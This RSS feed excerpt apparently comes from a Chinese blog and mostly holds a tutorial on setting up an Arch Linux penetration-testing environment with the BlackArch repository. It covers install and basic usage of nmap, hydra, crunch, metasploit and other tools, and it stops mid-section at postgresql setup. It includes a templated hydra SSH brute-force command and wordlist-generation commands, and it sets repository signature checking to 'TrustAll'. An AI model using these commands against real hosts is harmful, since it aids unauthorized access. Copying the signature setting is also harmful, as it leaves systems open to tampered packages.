</span></span><span class="line"><span class="cl">extra/xf86-video-openchrome 0.6.0-4 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.Org Openchrome drivers
</span></span><span class="line"><span class="cl">extra/xf86-video-sisusb 0.9.7-3
</span></span><span class="line"><span class="cl">    X.org SiS USB video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-vesa 2.4.0-3 (xorg-drivers xorg) 
</span></span><span class="line"><span class="cl">    X.org vesa video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-vmware 13.3.0-2 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org vmware video driver
</span></span><span class="line"><span class="cl">extra/xf86-video-voodoo 1.2.5-11 (xorg-drivers)
</span></span><span class="line"><span class="cl">    X.org 3dfx Voodoo1/Voodoo2 2D video driver
</span></span><span class="line"><span class="cl">community/xf86-video-qxl 0.1.5-7 (xorg-drivers)
</span></span><span class="line"><span class="cl">    Xorg X11 qxl video driver
</span></span></code></pre></td></tr></table>
</div>
</div><p>vesa 会自动装上, 自己是什么显卡就装什么, 不需要过多解释了吧&hellip;</p>
<p>Intel 核显</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S xf86-video-intel
</span></span></code></pre></td></tr></table>
</div>
</div><p>NVIDIA</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S xf86-video-nouveau
</span></span></code></pre></td></tr></table>
</div>
</div><p>AMD</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S xf86-video-amdgpu
</span></span></code></pre></td></tr></table>
</div>
</div><p>好啦 装完啦~</p>
<p>接下来系统就可以使用啦~</p>
]]></description>
</item><item>
    <title>用 Arch Linux 打造完美渗透环境</title>
    <link>http://weepingdogel.github.io/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/</link>
    <pubDate>Wed, 31 Jul 2019 21:19:52 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-nky7y7.png" referrerpolicy="no-referrer">
            </div><h2 id="简介arch-linux">简介Arch Linux</h2>
<p>Arch Linux是一款通用x86_64的GNU/Linux发行版，它采用滚动更新模式，尽全力给用户提供最新的稳定版软件。</p>
<blockquote>
<p>嘿嘿，很久不滚可能会滚挂哦</p>
</blockquote>
<p>刚装完的Arch只是一个基本系统，什么都没有，随后用户就可以根据自己的想法和喜好，安装自己需要的软件，然后通过高度自定义的配置，打造自己喜欢的、理想的系统。这也是Arch的可爱和有吸引力之处。所以Arch也是我最喜欢的发行版之一。</p>
<p>关于Arch Linux的更多详细内容，请参见<a href="https://wiki.archlinux.org/index.php/Arch_Linux_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>。</p>
<h2 id="本期内容介绍">本期内容介绍</h2>
<p>本期将会演示如何用Arch Linux打造完美的渗透环境。一切操作均为教程演示，请读者根据实际情况操作。没使用过Arch Linux的用户请<strong>谨慎操作</strong>，并仔细查阅<a href="https://wiki.archlinux.org/index.php/Main_page_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>。</p>
<p>那么，开始本期的内容吧。</p>
<h3 id="提示">提示</h3>
<p>本期博客会大量使用Arch Wiki的超链接，以方便理解部分内容。</p>
<h2 id="准备工作">准备工作</h2>
<h3 id="安装arch-linux">安装Arch Linux</h3>
<p>本期博客不会详细写出Arch Linux的安装过程，请参考<a href="https://wiki.archlinux.org/index.php/Installation_guide_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>安装Arch Linux，并做好基本的配置工作。</p>
<h3 id="选择轻量桌面环境">选择轻量桌面环境</h3>
<p>由于渗透测试中部分操作会占用大量的资源，所以请尽量按需求选择轻量的桌面环境，这里不建议使用 <a href="https://wiki.archlinux.org/index.php/GNOME_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Gnome</a> 和 <a href="https://wiki.archlinux.org/index.php/KDE_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">KDE</a>，因为二者占用的资源非常大，对低配用户不友好。</p>
<ol>
<li><a href="https://wiki.archlinux.org/index.php/LXDE_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">LXDE</a></li>
</ol>
<ul>
<li>轻量级GTK桌面环境，默认窗口管理器是 <a href="https://wiki.archlinux.org/index.php/Openbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">OpenBox</a> ，最轻量的桌面环境之一。</li>
</ul>
<ol start="2">
<li><a href="https://wiki.archlinux.org/index.php/LXQt_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">LXQT</a></li>
</ol>
<ul>
<li>2013年间，洪任諭（“PCMan”）启动了将 LXDE 移植到 Qt 的项目。所以LXQT相当于是使用QT的LXDE，默认窗口管理器还是 <a href="https://wiki.archlinux.org/index.php/Openbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">OpenBox</a> ，它比上面的LXDE还要轻量。</li>
</ul>
<ol start="3">
<li><a href="https://wiki.archlinux.org/index.php/Xfce_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">xfce4</a></li>
</ol>
<ul>
<li>目前我在用的桌面环境，基于GTK+2，这个是轻量化桌面环境中最好看的一个了。</li>
</ul>
<ol start="4">
<li><a href="https://wiki.archlinux.org/index.php/I3_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">i3wm</a></li>
</ol>
<ul>
<li>i3 是一种动态的<a href="https://en.wikipedia.org/wiki/Tiling_window_manager" target="_blank" rel="noopener noreffer">平铺式窗口管理器</a>，其灵感来自于面向开发者与资深用户的 <a href="https://wiki.archlinux.org/index.php/Wmii" target="_blank" rel="noopener noreffer">wmii</a>。 i3 的既定目标包括清晰可读的文档，完善的多显示器支持，基于树形结构的窗口管理，提供 <a href="https://wiki.archlinux.org/index.php/Vim" target="_blank" rel="noopener noreffer">vim</a> 式的多种操作模式。 ——摘自<a href="https://wiki.archlinux.org/index.php/I3_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>。</li>
</ul>
<ol start="5">
<li>自己DIY桌面环境</li>
</ol>
<ul>
<li>你可以使用上面介绍过的 <a href="https://wiki.archlinux.org/index.php/Openbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">OpenBox</a> 通过配置来DIY自己的桌面环境，也可以使用 <a href="https://wiki.archlinux.org/index.php/Fluxbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">fluxbox</a>、<a href="https://wiki.archlinux.org/index.php/I3_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">i3wm</a> 等。详细请参见 <del><a href="https://latiao233.github.io/2019/07/30/%E5%88%A9%E7%94%A8openbox%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83/#more" target="_blank" rel="noopener noreffer">利用openbox打造自己的桌面环境-辣条的博客(链接已失效)。</a></del></li>
</ul>
<p>本期博客也将会使用自定义桌面环境进行演示。</p>
<blockquote>
<p>OpenBox+xfce4-panel</p>
</blockquote>
<h3 id="添加black-arch源">添加Black Arch源</h3>
<p>当Arch Linux基本配置完成之后，就可以开始正常使用了，但是为了安装渗透工具，需要添加一个<strong>Black Arch软件源</strong></p>
<blockquote>
<h4 id="什么是black-arch"><strong>什么是Black Arch</strong></h4>
<p>BlackArch Linux，简称BlackArch，是一份基于Arch的Linux发行版。该发行版被设计用于系统渗透测试及安全研究。BlackArch提供一张自启动运行DVD镜像，其中包含有多个轻量级窗口管理器和一千多种用于渗透测试和计算机取证分析的专用工具。该系统即可以直接从镜像启动，也可以安装在硬盘、U盘或虚拟机上。 ——摘自<a href="https://zh.wikipedia.org/zh-hans/BlackArch_Linux" target="_blank" rel="noopener noreffer">维基百科(需要科学上网)</a></p>
<p>Black Arch官网：<a href="https://blackarch.org/" target="_blank" rel="noopener noreffer">blackarch.org</a></p>
</blockquote>
<p>如上我们知道，Black Arch是一个基于Arch Linux的独立发行版，但我们不需要去安装它，我们只需要添加它的软件源就好。</p>
<p>具体操作如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nano /etc/pacman.conf <span class="c1"># 编辑pacman.conf文件</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>pacman.conf</code>文件的末尾加入以下内容:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[blackarch]
</span></span><span class="line"><span class="cl">SigLevel = Optional TrustAll
</span></span><span class="line"><span class="cl">Server = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -Syyu
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果没问题，就可以使用Black Arch的软件源了。</p>
<h2 id="开始安装配置常用渗透工具">开始安装、配置常用渗透工具</h2>
<h3 id="端口扫描和信息收集">端口扫描和信息收集</h3>
<h4 id="namp">Namp</h4>
<p>首先搬出<a href="https://baike.baidu.com/item/nmap/1400075?fr=aladdin" target="_blank" rel="noopener noreffer">Nmap</a>，这是一个很常用的扫描工具，可以在渗透的过程中扫描到对方的IP、端口、操作系统等情况。</p>
<h5 id="安装方法">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S nmap
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="基本用法">基本用法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap &lt;目标IP地址&gt; <span class="c1"># 简单的扫描</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O &lt;目标IP地址&gt; <span class="c1"># 扫描目标的操作系统情况</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -sP &lt;目标IP地址&gt; <span class="c1"># ping扫描</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>更多用法可参考搜索引擎查询。</p>
<h4 id="xerosploit">xerosploit</h4>
<p>这个扫描工具比<strong>Nmap</strong>要炫酷一些，色彩也比较好看，用法也很简单，比<strong>Metasploit</strong>还简单。</p>
<h5 id="安装方法-1">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S xerosploit
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="用法">用法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo xerosploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后执行<code>help</code>就可以看到软件自带的帮助文档了</p>
<h4 id="nslookup">nslookup</h4>
<p>这个命令是查看域名记录的，可以查看Cname、A等各种记录。它包含在<strong>dnsutils</strong>这个包里</p>
<h5 id="安装方法-2">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S dnsutils
</span></span></code></pre></td></tr></table>
</div>
</div><p>安装这个包dnsutils即可。</p>
<blockquote>
<p>我也不太了解这个，所以具体怎么用请自行百度、谷歌一下吧。</p>
</blockquote>
<h4 id="nbtscan">nbtscan</h4>
<p>内网扫描工具，可以扫描IP段内是否有存活的IP，速度比nmap要快一些。但是只能用于局域网。</p>
<h5 id="安装方法-3">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S nbtscan
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法">使用方法</h5>
<ul>
<li>基本扫描</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nbtscan  -r  192.168.16.0/24
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>官方帮助文档</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&#34;Human-readable service names&#34; (-h) option cannot be used without verbose (-v) option.
</span></span><span class="line"><span class="cl">Usage:
</span></span><span class="line"><span class="cl">nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;) 
</span></span><span class="line"><span class="cl">	-v		verbose output. Print all names received
</span></span><span class="line"><span class="cl">			from each host
</span></span><span class="line"><span class="cl">	-d		dump packets. Print whole packet contents.
</span></span><span class="line"><span class="cl">	-e		Format output in /etc/hosts format.
</span></span><span class="line"><span class="cl">	-l		Format output in lmhosts format.
</span></span><span class="line"><span class="cl">			Cannot be used with -v, -s or -h options.
</span></span><span class="line"><span class="cl">	-t timeout	wait timeout milliseconds for response.
</span></span><span class="line"><span class="cl">			Default 1000.
</span></span><span class="line"><span class="cl">	-b bandwidth	Output throttling. Slow down output
</span></span><span class="line"><span class="cl">			so that it uses no more that bandwidth bps.
</span></span><span class="line"><span class="cl">			Useful on slow links, so that ougoing queries
</span></span><span class="line"><span class="cl">			don&#39;t get dropped.
</span></span><span class="line"><span class="cl">	-r		use local port 137 for scans. Win95 boxes
</span></span><span class="line"><span class="cl">			respond to this only.
</span></span><span class="line"><span class="cl">			You need to be root to use this option on Unix.
</span></span><span class="line"><span class="cl">	-q		Suppress banners and error messages,
</span></span><span class="line"><span class="cl">	-s separator	Script-friendly output. Don&#39;t print
</span></span><span class="line"><span class="cl">			column and record headers, separate fields with separator.
</span></span><span class="line"><span class="cl">	-h		Print human-readable names for services.
</span></span><span class="line"><span class="cl">			Can only be used with -v option.
</span></span><span class="line"><span class="cl">	-m retransmits	Number of retransmits. Default 0.
</span></span><span class="line"><span class="cl">	-f filename	Take IP addresses to scan from file filename.
</span></span><span class="line"><span class="cl">			-f - makes nbtscan take IP addresses from stdin.
</span></span><span class="line"><span class="cl">	&lt;scan_range&gt;	what to scan. Can either be single IP
</span></span><span class="line"><span class="cl">			like 192.168.1.1 or
</span></span><span class="line"><span class="cl">			range of addresses in one of two forms: 
</span></span><span class="line"><span class="cl">			xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx.
</span></span><span class="line"><span class="cl">Examples:
</span></span><span class="line"><span class="cl">	nbtscan -r 192.168.1.0/24
</span></span><span class="line"><span class="cl">		Scans the whole C-class network.
</span></span><span class="line"><span class="cl">	nbtscan 192.168.1.25-137
</span></span><span class="line"><span class="cl">		Scans a range from 192.168.1.25 to 192.168.1.137
</span></span><span class="line"><span class="cl">	nbtscan -v -s : 192.168.1.0/24
</span></span><span class="line"><span class="cl">		Scans C-class network. Prints results in script-friendly
</span></span><span class="line"><span class="cl">		format using colon as field separator.
</span></span><span class="line"><span class="cl">		Produces output like that:
</span></span><span class="line"><span class="cl">		192.168.0.1:NT_SERVER:00U
</span></span><span class="line"><span class="cl">		192.168.0.1:MY_DOMAIN:00G
</span></span><span class="line"><span class="cl">		192.168.0.1:ADMINISTRATOR:03U
</span></span><span class="line"><span class="cl">		192.168.0.2:OTHER_BOX:00U
</span></span><span class="line"><span class="cl">		...
</span></span><span class="line"><span class="cl">	nbtscan -f iplist
</span></span><span class="line"><span class="cl">		Scans IP addresses specified in file iplist.
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>这个我也不是很了解，因为平时都用nmap。</p>
</blockquote>
<h4 id="burpsuite">burpsuite</h4>
<p>抓包神器，需要安装java依赖。</p>
<h5 id="安装方法-4">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S burpsuite
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-1">使用方法</h5>
<p>burpsuite有图形界面，可以通过搜索引擎找到使用方法。</p>
<blockquote>
<p>图形界面的东西不好讲，图片一多博客就加载不出来了，请见谅。</p>
</blockquote>
<h3 id="暴力破解密码生成">暴力破解、密码生成</h3>
<h4 id="hydra">hydra</h4>
<p>暴力破解工具，中文名九头蛇，功能很强大。</p>
<h5 id="安装方法-5">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S hydra
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-2">使用方法</h5>
<ul>
<li>爆破ssh端口</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hydra -l &lt;用户名&gt; -P &lt;密码字典.txt&gt; -v -e ns -t &lt;次数&gt; &lt;目标IP&gt; ssh
</span></span></code></pre></td></tr></table>
</div>
</div><p>具体使用方法可以通过搜索引擎查询。</p>
<h4 id="crunch">crunch</h4>
<p>强大的密码字典生成器。</p>
<h5 id="安装方法-6">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S crunch
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-3">使用方法</h5>
<p><strong>Crunch中的特殊字符有：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s1">&#39;%&#39;</span> 插入数字
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;@&#39;</span> 插入小写字母
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;,&#39;</span> 插入大写字母
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;^&#39;</span> 插入符号
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Crunch中用到的命令参数有：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-b <span class="c1">#按大小分割字典文件，比如后跟20mib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-c <span class="c1">#密码个数（行数），比如8000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-d <span class="c1">#限制出现相同元素的个数（至少出现元素个数），-d 3就不会出现aabbbb之类的情况</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-e <span class="c1">#定义停止生成密码 ，比如-e abcd：到abcd停止生成密码</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-f <span class="c1">#调用密码库文件，比如-f charset.lst mixalpha-numeric 意为调用密码库 charset.lst中的 mixalpha-numeric项目字符</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-i <span class="c1">#改变输出格式</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-l <span class="c1">#与-t搭配使用</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-m <span class="c1">#与-p搭配使用</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-o <span class="c1">#保存为</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-p <span class="c1">#定义密码元素</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-q <span class="c1">#读取字典</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-r <span class="c1">#定义从某一个地方重新开始</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-s <span class="c1">#第一个密码，从xxx开始</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-t <span class="c1">#定义输出格式</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-z <span class="c1">#打包压缩，格式支持 gzip, bzip2, lzma, 7z</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>生成最小1位，最大8位，由26个小写字母为元素的所有组合:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ crunch <span class="m">1</span> <span class="m">8</span> &gt;&gt; 1.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>生成 最小为1,最大为4.由abcd为元素的所有组合:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ crunch <span class="m">1</span> <span class="m">4</span> abcd &gt;&gt; 2.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>生成以“yale”“test”为元素的所有密码组合:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ crunch <span class="m">4</span> <span class="m">5</span> -p yale <span class="nb">test</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>还有更多的方法可以自行通过搜索引擎查找。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<h4 id="metasploit">metasploit</h4>
<p>这是最重要的一个工具，没有它，内网的渗透也是无法完整进行的。</p>
<h5 id="安装方法-7">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S metasploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>安装完后执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>即可。</p>
<h5 id="修复数据库问题">修复数据库问题</h5>
<p>启动msf以后是不是出现了三行报错？这是没有连接数据库导致的。</p>
<h6 id="安装postgresql">安装postgresql</h6>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S postgresql
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="配置postgresql">配置postgresql</h6>
